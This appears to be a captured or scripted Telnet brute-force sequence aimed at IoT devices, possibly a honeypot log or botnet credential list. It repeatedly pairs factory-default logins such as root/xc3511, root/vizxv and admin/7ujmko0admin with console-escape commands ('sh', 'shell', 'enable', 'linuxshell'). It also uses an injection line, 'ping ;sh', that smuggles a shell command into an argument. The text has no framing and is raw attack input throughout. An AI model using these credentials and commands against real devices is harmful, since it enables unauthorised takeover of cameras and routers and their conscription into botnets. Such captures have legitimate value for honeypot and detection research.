root
12345
sh
shell
enable
system
linuxshell
ping ;sh
root
54321
sh
shell
enable
system
linuxshell
ping ;sh
admin
7ujmko0admin
sh
shell
enable
system
linuxshell
ping ;sh
root
54321
sh
shell
enable
system
linuxshell
ping ;sh
admin

sh
shell
enable
system
linuxshell
ping ;sh
root
vizxv
sh
shell
enable
system
linuxshell
ping ;sh
admin

sh
shell
enable
system
linuxshell
ping ;sh
admin

admin
sh
shell
enable
system
linuxshell
ping ;sh
root
vizxv
sh
shell
enable
system
linuxshell
ping ;sh
admin
admin
sh
shell
enable
system
linuxshell
ping ;sh
root

vizxv
sh
shell
enable
system
linuxshell
ping ;sh
root

root
sh
shell
enable
system
linuxshell
ping ;sh
root

123456
sh
shell
enable
system
linuxshell
ping ;sh
root

xc3511
sh
shell
enable
system
linuxshell
ping ;sh
admin
1111
sh
shell
enable
system
linuxshell
ping ;sh
root
hi3518
sh
shell
enable
system
linuxshell
ping ;sh
root
jvbzd
sh
shell
enable
system
linuxshell
ping ;sh
root

password
sh
shell
enable
system
linuxshell
ping ;sh
root

pass
sh
shell
enable
system
linuxshell
ping ;sh
root
klv1234
sh
shell
enable
system
linuxshell
ping ;sh
